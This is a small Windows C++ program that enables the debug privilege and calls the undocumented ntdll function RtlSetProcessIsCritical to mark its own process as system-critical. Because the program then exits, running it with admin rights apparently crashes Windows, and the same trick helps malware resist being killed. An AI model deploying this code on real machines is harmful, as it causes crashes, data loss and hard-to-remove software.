// RtlSetProcessIsCritical.cpp : Defines the entry point for the application.
//

#include <windows.h>

//////////////////////////////////////////////////////////////////////////
// Code from http://www.netcore2k.net/projects/freeram
// Enables specified privilege for process
//////////////////////////////////////////////////////////////////////////
BOOL EnablePriv(LPCSTR lpszPriv) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken)) return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

//////////////////////////////////////////////////////////////////////////
// Function declaration for RtlSetProcessIsCritical
// ------------------------------------------------
// NewValue is the new critical setting - set it to 1 for a critical
//		process, 0 for a normal process
//
// OldValue, if not null, will receive the old setting for the process
//
// bNeedScb specifics whether system critical breaks will be required
//		(and already enabled) for the process
//////////////////////////////////////////////////////////////////////////
typedef long (WINAPI *RtlSetProcessIsCritical)(IN BOOLEAN bNew, OUT BOOLEAN* pbOld, IN BOOLEAN bNeedScb);
typedef BOOL (WINAPI *RtlAdjustPrivilege)(ULONG, BOOL, BOOL, PBOOLEAN);


int main() {
    // Enable the SE_DEBUG_NAME privilege
    if (EnablePriv((LPCSTR)SE_DEBUG_NAME) != TRUE) {
        return 0;
    }

    // Load ntdll.dll so we can access the function
    HANDLE ntdll = LoadLibrary("ntdll.dll");
    if (ntdll == NULL) {
        return 0;
    }

    // Declare the function and obtain it using GetProcAddress
    RtlSetProcessIsCritical SetCriticalProcess;
    SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");

    if (!SetCriticalProcess) {
        return 0;
    }

    RtlAdjustPrivilege AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
    if (!AdjustPrivilege) {
        return 0;
    }

    BOOLEAN b;
    AdjustPrivilege(20UL, TRUE, FALSE, &b);

    // Call it - enable system critical status
    SetCriticalProcess(TRUE, NULL, FALSE);

    return 0;
}
